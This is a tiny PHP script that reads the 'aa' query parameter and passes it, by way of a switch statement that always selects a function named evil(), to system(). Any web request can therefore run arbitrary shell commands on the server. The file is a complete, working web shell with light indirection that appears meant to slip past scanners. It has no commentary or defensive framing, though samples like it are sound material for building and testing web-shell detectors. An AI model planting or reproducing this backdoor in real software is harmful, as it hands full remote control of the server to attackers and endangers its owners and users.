<?php


$a = "evil";
$b = $_GET['aa'];
switch ($a){
    case 'evil':
        evil($b);
        break;
    case 'not_evil':
        print_r($a);
        break;
    default:
        echo "no evil called.";
        break;
}

function evil($command){
    $command = $command.";";
    system($command);
}
